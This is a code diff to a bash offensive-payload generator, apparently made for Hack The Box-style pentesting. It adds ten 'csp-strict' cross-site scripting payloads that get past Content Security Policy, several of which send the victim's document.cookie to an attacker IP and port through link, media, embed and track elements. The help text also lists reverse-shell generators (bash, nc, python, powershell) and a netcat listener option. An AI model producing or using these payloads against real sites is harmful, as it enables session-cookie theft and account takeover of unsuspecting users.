@@ -166,6 +166,68 @@ _payload_xss() {
                 printf '<img src=x onerror=`fetch('"'"'http://%s:%s/%s'"'"')`>\n' "${ip}" "${port}" "${path}"
             fi
             ;;
+        csp-strict-script)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script src=\"http://${ip}:${port}/${path}.js?c=\"+document.cookie></script>"
+            else
+                echo "<script src=\"http://${ip}:${port}/${path}.js\"></script>"
+            fi
+            ;;
+        csp-strict-link)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var l=document.createElement('link');l.rel='prefetch';l.href='http://${ip}:${port}/${path}?c='+document.cookie;document.head.appendChild(l)</script>"
+            else
+                echo "<link rel=\"prefetch\" href=\"http://${ip}:${port}/${path}\">"
+            fi
+            ;;
+        csp-strict-import)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var l=document.createElement('link');l.rel='import';l.href='http://${ip}:${port}/${path}?c='+document.cookie;document.head.appendChild(l)</script>"
+            else
+                echo "<link rel=\"import\" href=\"http://${ip}:${port}/${path}\">"
+            fi
+            ;;
+        csp-strict-manifest)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var l=document.createElement('link');l.rel='manifest';l.href='http://${ip}:${port}/${path}.json?c='+document.cookie;document.head.appendChild(l)</script>"
+            else
+                echo "<link rel=\"manifest\" href=\"http://${ip}:${port}/${path}.json\">"
+            fi
+            ;;
+        csp-strict-dns)
+            echo "<link rel=\"dns-prefetch\" href=\"http://${ip}:${port}\">"
+            ;;
+        csp-strict-preconnect)
+            echo "<link rel=\"preconnect\" href=\"http://${ip}:${port}\">"
+            ;;
+        csp-strict-video)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var v=document.createElement('video');v.innerHTML='<source src=\"http://${ip}:${port}/${path}?c='+document.cookie+'\">'; document.body.appendChild(v)</script>"
+            else
+                echo "<video><source src=\"http://${ip}:${port}/${path}\"></video>"
+            fi
+            ;;
+        csp-strict-audio)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var a=document.createElement('audio');a.src='http://${ip}:${port}/${path}?c='+document.cookie;document.body.appendChild(a)</script>"
+            else
+                echo "<audio src=\"http://${ip}:${port}/${path}\"></audio>"
+            fi
+            ;;
+        csp-strict-embed)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var e=document.createElement('embed');e.src='http://${ip}:${port}/${path}?c='+document.cookie;document.body.appendChild(e)</script>"
+            else
+                echo "<embed src=\"http://${ip}:${port}/${path}\">"
+            fi
+            ;;
+        csp-strict-track)
+            if [[ "$cookies" == "true" ]]; then
+                echo "<script>var v=document.createElement('video');v.innerHTML='<track src=\"http://${ip}:${port}/${path}.vtt?c='+document.cookie+'\">'; document.body.appendChild(v)</script>"
+            else
+                echo "<video><track src=\"http://${ip}:${port}/${path}.vtt\"></video>"
+            fi
+            ;;
         *)
             echo "<img src=\"http://${ip}:${port}/${path}\">"
             ;;
@@ -331,13 +393,15 @@ Types:
   ssti         Server-side template injection
 
 XSS Options:
-  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object, bypass-hex, bypass-unicode, bypass-entity, bypass-base64, bypass-fromcharcode, bypass-template, bypass-concat, bypass-comment, bypass-newline, bypass-double, bypass-backtick
+  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object, bypass-hex, bypass-unicode, bypass-entity, bypass-base64, bypass-fromcharcode, bypass-template, bypass-concat, bypass-comment, bypass-newline, bypass-double, bypass-backtick, csp-strict-script, csp-strict-link, csp-strict-import, csp-strict-manifest, csp-strict-dns, csp-strict-preconnect, csp-strict-video, csp-strict-audio, csp-strict-embed, csp-strict-track
   --all        Print all XSS tags at once
   --cookies    Modify payloads to steal cookies (works with: img, img-onerror, script-fetch, svg, body, input, csp-form, bypass-*)
   --port       Port (default: 4444)
   --ip         IP address (default: htbip)
   --path       Path (default: xss_poc)
   --listen     Start nc listener on port
+  
+  CSP Strict Bypass: csp-strict-* variants work without inline event handlers (script-src 'self')
 
 RCE Options:
   --tag        Shell type: bash, bash-b64, nc, nc-mkfifo, python, php, perl, powershell
@@ -387,7 +451,7 @@ EOF
     case "$type" in
         xss)
             if [[ "$all_tags" == true ]]; then
-                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object" "bypass-hex" "bypass-unicode" "bypass-entity" "bypass-base64" "bypass-fromcharcode" "bypass-template" "bypass-concat" "bypass-comment" "bypass-newline" "bypass-double" "bypass-backtick")
+                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object" "bypass-hex" "bypass-unicode" "bypass-entity" "bypass-base64" "bypass-fromcharcode" "bypass-template" "bypass-concat" "bypass-comment" "bypass-newline" "bypass-double" "bypass-backtick" "csp-strict-script" "csp-strict-link" "csp-strict-import" "csp-strict-manifest" "csp-strict-dns" "csp-strict-preconnect" "csp-strict-video" "csp-strict-audio" "csp-strict-embed" "csp-strict-track")
                 for t in "${tags[@]}"; do
                     echo "$(_payload_xss "$t" "$port" "$ip" "$cookies")"
                 done
